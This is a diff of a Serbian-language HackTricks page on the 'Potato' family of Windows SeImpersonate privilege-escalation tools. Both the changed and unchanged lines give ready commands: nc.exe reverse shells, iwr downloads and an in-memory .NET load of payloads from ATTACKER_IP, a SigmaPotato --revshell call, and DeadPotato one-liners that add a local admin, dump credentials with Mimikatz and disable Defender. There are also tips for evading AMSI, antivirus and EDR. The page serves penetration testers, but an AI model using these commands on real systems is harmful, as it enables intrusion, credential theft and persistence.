@@ -3,12 +3,12 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!WARNING]
-> **JuicyPotato ne radi** na Windows Server 2019 i Windows 10 build 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu da se koriste za iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`.** Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno obrađuje `PrintSpoofer` alat, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.
+> **JuicyPotato ne radi** na Windows Server 2019 i Windows 10 build 1809 i novijim verzijama. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu se koristiti za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno obrađuje alat `PrintSpoofer`, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima, na kojima JuicyPotato više ne radi.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
 
 > [!TIP]
-> Moderan alternativ koji se često održava u 2024–2025 je SigmaPotato (fork GodPotato) koji dodaje upotrebu in-memory/.NET reflection i proširenu podršku za OS. Pogledajte brzo uputstvo ispod i repo u References.
+> Moderna alternativa koja se često održava tokom 2024–2025. godine jeste SigmaPotato (fork alata GodPotato), koji dodaje upotrebu in-memory/.NET reflection mehanizama i proširenu podršku za OS. Pogledajte kratko uputstvo za korišćenje u nastavku i repo u odeljku References.
 
-Related pages for background and manual techniques:
+Povezane stranice sa pozadinskim informacijama i manuelnim tehnikama:
 
 {{#ref}}
 seimpersonate-from-high-to-system.md
@@ -22,27 +22,27 @@ from-high-integrity-to-system-with-name-pipes.md
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-## Zahtevi i česti problemi
+## Zahtevi i uobičajene prepreke
 
-Sve sledeće tehnike oslanjaju se na zloupotrebu privilegovane usluge sposobne za impersonation iz konteksta koji poseduje jednu od ovih privilegija:
+Sve navedene tehnike oslanjaju se na zloupotrebu privilegovanog servisa koji podržava impersonation, iz konteksta koji poseduje jednu od sledećih privilegija:
 
-- SeImpersonatePrivilege (najčešće) ili SeAssignPrimaryTokenPrivilege
-- Visok integritet nije neophodan ako token već ima SeImpersonatePrivilege (tipično za mnoge servisne naloge kao što su IIS AppPool, MSSQL, itd.)
+- SeImpersonatePrivilege (najčešća) ili SeAssignPrimaryTokenPrivilege
+- High integrity nije potreban ako token već poseduje SeImpersonatePrivilege (što je uobičajeno za mnoge service naloge, kao što su IIS AppPool, MSSQL itd.)
 
 Brzo proverite privilegije:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
-Operational notes:
+Operativne napomene:
 
-- Ako vaš shell radi pod ograničenim tokenom bez SeImpersonatePrivilege (uobičajeno za Local Service/Network Service u nekim kontekstima), povratite podrazumevana privilegija naloga koristeći FullPowers, zatim pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`
-- PrintSpoofer zahteva da Print Spooler servis radi i da mu se može pristupiti preko lokalne RPC krajnje tačke (spoolss). U pojačano zaštićenim okruženjima gde je Spooler onemogućen nakon PrintNightmare, pređnost dajte RoguePotato/GodPotato/DCOMPotato/EfsPotato.
-- RoguePotato zahteva OXID resolver dostupan na TCP/135. Ako je egress blokiran, koristite redirector/port-forwarder (see example below). Starije verzije su zahtevale -f parametar.
-- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedan pipe blokiran, probajte alternativne pipe-ove (lsarpc, efsrpc, samr, lsass, netlogon).
-- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznatu/nepodržanu RPC autentifikacionu uslugu; pokušajte drugi pipe/transport ili proverite da li ciljna usluga radi.
-- “Kitchen-sink” forks kao što je DeadPotato uključuju dodatne payload module (Mimikatz/SharpHound/Defender off) koji zapisuju na disk; očekujte veću detekciju od strane EDR-a u poređenju sa tanjim originalima.
+- Ako vaša shell sesija radi pod ograničenim tokenom bez SeImpersonatePrivilege (što je u nekim kontekstima uobičajeno za Local Service/Network Service), vratite podrazumevane privilegije naloga pomoću FullPowers, a zatim pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
+- PrintSpoofer zahteva da Print Spooler servis bude pokrenut i dostupan preko lokalne RPC krajnje tačke (spoolss). U ojačanim okruženjima u kojima je Spooler onemogućen nakon PrintNightmare-a, koristite RoguePotato/GodPotato/DCOMPotato/EfsPotato.
+- RoguePotato zahteva OXID resolver dostupan preko TCP/135. Ako je izlazni saobraćaj blokiran, koristite redirector/port-forwarder (pogledajte primer u nastavku). Starije verzije zahtevale su zastavicu -f.
+- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedna cev blokirana, pokušajte sa alternativnim cevima (lsarpc, efsrpc, samr, lsass, netlogon).
+- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznat/nepodržan RPC authentication service; pokušajte sa drugom cevi/transportom ili proverite da li ciljni servis radi.
+- “Kitchen-sink” fork-ovi kao što je DeadPotato objedinjuju dodatne payload module (Mimikatz/SharpHound/Defender off) koji upisuju podatke na disk; očekujte veću EDR detekciju u poređenju sa slim originalima.
 
-## Brzi demo
+## Brza demonstracija
 
 ### PrintSpoofer
 ```bash
@@ -60,8 +60,8 @@ NULL
 
 ```
 Napomene:
-- Možete koristiti -i za pokretanje interaktivnog procesa u trenutnoj konzoli, ili -c za izvršavanje jednolinijske naredbe.
-- Zahteva Spooler servis. Ako je onemogućen, ovo neće uspeti.
+- Možete koristiti `-i` da pokrenete interaktivni proces u trenutnoj konzoli ili `-c` da izvršite one-liner.
+- Zahteva Spooler service. Ako je onemogućen, ovo neće uspeti.
 
 ### RoguePotato
 ```bash
@@ -69,7 +69,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-Ako je outbound 135 blokiran, pivot the OXID resolver via socat na vašem redirectoru:
+Ako je odlazni port 135 blokiran, usmerite OXID resolver preko socat-a na vašem redirector-u:<sup>[[9]](#references)</sup>
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -79,22 +79,22 @@ RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
 ```
 ### PrintNotifyPotato
 
-PrintNotifyPotato je noviji primitiv zloupotrebe COM-a objavljen krajem 2022. koji cilja **PrintNotify** servis umesto Spooler/BITS. Binar instancira PrintNotify COM server, ubacuje lažni `IUnknown`, zatim pokreće privilegovani callback preko `CreatePointerMoniker`. Kada se PrintNotify servis (koji radi kao **SYSTEM**) poveže nazad, proces duplira vraćeni token i pokreće prosleđeni payload sa punim privilegijama.
+PrintNotifyPotato je noviji COM abuse primitive objavljen krajem 2022. godine, koji cilja **PrintNotify** service umesto Spooler/BITS. Binary instancira PrintNotify COM server, zamenjuje ga lažnim `IUnknown` objektom, a zatim pokreće privilegovan callback kroz `CreatePointerMoniker`. Kada se PrintNotify service, koji radi kao **SYSTEM**, poveže nazad, process duplicira vraćeni token i pokreće prosleđeni payload sa potpunim privilegijama.<sup>[[13]](#references)</sup>
 
-Key operational notes:
+Ključne operativne napomene:
 
-* Radi na Windows 10/11 i Windows Server 2012–2022 sve dok je instaliran Print Workflow/PrintNotify servis (prisutan je čak i kada je legacy Spooler onemogućen nakon PrintNightmare).
-* Zahteva da kontekst koji poziva ima **SeImpersonatePrivilege** (tipično za IIS APPPOOL, MSSQL i naloge servisnih zadataka).
-* Prihvata ili direktnu komandu ili interaktivni režim tako da možete ostati u originalnoj konzoli. Primer:
+* Radi na Windows 10/11 i Windows Server 2012–2022, pod uslovom da je Print Workflow/PrintNotify service instaliran (prisutan je čak i kada je legacy Spooler onemogućen nakon PrintNightmare-a).
+* Zahteva da calling context poseduje `SeImpersonatePrivilege` (uobičajeno za IIS APPPOOL, MSSQL i service account-e scheduled taskova).
+* Prihvata ili direktnu komandu ili interactive mode, tako da možete ostati u originalnoj konzoli. Primer:
 
 ```cmd
 PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
 PrintNotifyPotato.exe whoami
 ```
 
-* Pošto je isključivo zasnovan na COM-u, nisu potrebni named-pipe listeners niti external redirectors, što ga čini drop-in replacement na hostovima gde Defender blokira RoguePotato’s RPC binding.
+* Pošto je u potpunosti zasnovan na COM-u, nisu potrebni named-pipe listeners niti external redirectors, što ga čini direktnom zamenom na hostovima gde Defender blokira RoguePotato-ovo RPC binding povezivanje.
 
-Operatori poput Ink Dragon pokreću PrintNotifyPotato odmah nakon što ostvare ViewState RCE na SharePoint-u, kako bi pivotovali sa `w3wp.exe` workera na SYSTEM pre instalacije ShadowPad.
+Operateri poput Ink Dragon-a pokreću PrintNotifyPotato odmah nakon dobijanja ViewState RCE-a na SharePoint-u, kako bi izvršili pivot sa `w3wp.exe` worker process-a na SYSTEM pre instaliranja ShadowPad-a.<sup>[[14]](#references)</sup>
 
 ### SharpEfsPotato
 ```bash
@@ -132,7 +132,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-Savet: Ako jedan pipe zakaže ili ga EDR blokira, probajte ostale podržane pipes:
+Savet: Ako jedan pipe ne uspe ili ga EDR blokira, pokušajte sa drugim podržanim pipe-ovima:
 ```text
 EfsPotato <cmd> [pipe]
 pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
@@ -145,10 +145,10 @@ pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 ```
 Napomene:
 - Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutan SeImpersonatePrivilege.
-- Preuzmi binarni fajl koji odgovara instaliranom runtime-u (npr., `GodPotato-NET4.exe` na modernom Serveru 2022).
-- Ako je tvoj početni execution primitive webshell/UI sa kratkim timeout-ima, postavi payload kao skriptu i zamoli GodPotato da je pokrene umesto duge inline komande.
+- Preuzmite binarni fajl koji odgovara instaliranom runtime-u (npr. `GodPotato-NET4.exe` na modernom Server 2022).
+- Ako je vaš početni execution primitive webshell/UI sa kratkim timeout-ima, postavite payload kao script i zatražite od GodPotato da ga pokrene umesto dugog inline command-a.<sup>[[12]](#references)</sup>
 
-Quick staging pattern from a writable IIS webroot:
+Brz staging pattern iz IIS webroot-a sa omogućenom mogućnošću upisa:
 ```powershell
 iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
 iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
@@ -158,7 +158,7 @@ iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato pruža dve varijante koje ciljaju servisne DCOM objekte koji su podrazumevano postavljeni na RPC_C_IMP_LEVEL_IMPERSONATE. Kompajlirajte ili koristite priložene binaries i pokrenite svoju naredbu:
+DCOMPotato pruža dve varijante usmerene na DCOM objekte servisa koji podrazumevano koriste RPC_C_IMP_LEVEL_IMPERSONATE. Izgradite ili koristite obezbeđene binaries i pokrenite svoju komandu:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -166,9 +166,9 @@ PrinterNotifyPotato.exe "cmd /c whoami"
 # McpManagementService variant (Server 2022 also)
 McpManagementPotato.exe "cmd /c whoami"
 ```
-### SigmaPotato (ažuriran fork GodPotato)
+### SigmaPotato (ažurirani fork GodPotato)
 
-SigmaPotato dodaje savremene pogodnosti kao što su in-memory execution putem .NET reflection i PowerShell reverse shell helper.
+SigmaPotato dodaje moderne pogodnosti poput izvršavanja iz memorije putem .NET reflection-a i PowerShell reverse shell helper-a.<sup>[[8]](#references)</sup>
 ```powershell
 # Load and execute from memory (no disk touch)
 [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
@@ -177,25 +177,25 @@ SigmaPotato dodaje savremene pogodnosti kao što su in-memory execution putem .N
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-Additional perks in 2024–2025 builds (v1.2.x):
-- Ugrađeni reverse shell flag `--revshell` i uklanjanje 1024-znakovnog PowerShell ograničenja, tako da možete poslati duge AMSI-bypassing payloads odjednom.
-- Sintaksa pogodna za reflection (`[SigmaPotato]::Main()`), plus prost trik za izbegavanje AV pomoću `VirtualAllocExNuma()` koji zbunjuje jednostavne heuristike.
-- Odvojen `SigmaPotatoCore.exe` kompajliran za .NET 2.0 za okruženja PowerShell Core.
+Dodatne pogodnosti u izdanjima iz 2024–2025. (v1.2.x):
+- Ugrađena opcija za reverse shell `--revshell` i uklanjanje ograničenja od 1024 karaktera za PowerShell, pa možete pokrenuti dugačke payload-e za zaobilaženje AMSI-ja odjednom.
+- Sintaksa pogodna za reflection (`[SigmaPotato]::Main()`), uz rudimentarni trik za izbegavanje AV-a putem `VirtualAllocExNuma()`, kojim se mogu zbuniti jednostavni heuristički mehanizmi.
+- Zaseban `SigmaPotatoCore.exe` kompajliran za .NET 2.0 okruženja sa PowerShell Core.
 
-### DeadPotato (2024 GodPotato rework with modules)
+### DeadPotato (GodPotato rework iz 2024. sa modulima)
 
-DeadPotato zadržava GodPotato OXID/DCOM impersonation chain, ali ugrađuje post-exploitation helpere tako da operatori mogu odmah preuzeti SYSTEM i izvršiti persistence/collection bez dodatnih alata.
+DeadPotato zadržava GodPotato OXID/DCOM impersonation lanac, ali ugrađuje pomoćne post-exploitation funkcije kako bi operatori mogli odmah da preuzmu SYSTEM privilegije i izvrše persistence/collection bez dodatnih alata.<sup>[[15]](#references)</sup>
 
-Common modules (all require SeImpersonatePrivilege):
+Uobičajeni moduli (svi zahtevaju SeImpersonatePrivilege):
 
-- `-cmd "<cmd>"` — pokreće proizvoljnu komandu kao SYSTEM.
+- `-cmd "<cmd>"` — pokretanje proizvoljne komande kao SYSTEM.
 - `-rev <ip:port>` — brzi reverse shell.
-- `-newadmin user:pass` — kreira lokalnog administratora za persistence.
-- `-mimi sam|lsa|all` — dropuje i pokreće Mimikatz da dumpuje kredencijale (piše na disk, bučno).
-- `-sharphound` — pokreće SharpHound collection kao SYSTEM.
-- `-defender off` — gasi Defender real-time protection (veoma bučno).
+- `-newadmin user:pass` — kreiranje lokalnog administratora za persistence.
+- `-mimi sam|lsa|all` — preuzimanje i pokretanje Mimikatz-a radi dump-ovanja kredencijala (upisuje podatke na disk, primetno je).
+- `-sharphound` — pokretanje SharpHound collection-a kao SYSTEM.
+- `-defender off` — isključivanje Defender real-time protection-a (veoma primetno).
 
-Example one-liners:
+Primeri jednolinijskih komandi:
 ```cmd
 # Blind reverse shell
 DeadPotato.exe -rev 10.10.14.7:4444
@@ -206,24 +206,24 @@ DeadPotato.exe -newadmin pwned:P@ssw0rd!
 # Run SharpHound immediately after priv-esc
 DeadPotato.exe -sharphound
 ```
-Zbog toga što isporučuje dodatne binaries, očekujte više AV/EDR flags; koristite tanji GodPotato/SigmaPotato kada je stealth važan.
+Pošto isporučuje dodatne binarne datoteke, očekujte više AV/EDR detekcija; kada je stealth važan, koristite kompaktniji GodPotato/SigmaPotato.
 
-## References
+## Reference
 
-- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
-- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
-- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
-- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
-- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
-- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
-- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
-- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
-- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
-- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
-- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
-- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
-- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
-- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
-- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)
+- [1] [PrintSpoofer – Zloupotreba privilegija za impersonaciju na Windows 10 i Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
+- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
+- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
+- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
+- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
+- [9] [Nema više JuicyPotato? Stara priča, dobrodošao RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
+- [10] [FullPowers – Vraćanje podrazumevanih privilegija tokena za servisne naloge](https://github.com/itm4n/FullPowers)
+- [11] [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM-a](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato do SYSTEM-a](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
+- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
+- [14] [Check Point Research – Unutar operacije Ink Dragon: otkrivanje relay mreže i unutrašnjeg rada stealth ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [15] [DeadPotato – prerada GodPotato sa ugrađenim post-ex modulima](https://github.com/lypd0/DeadPotato)
 
 {{#include ../../banners/hacktricks-training.md}}
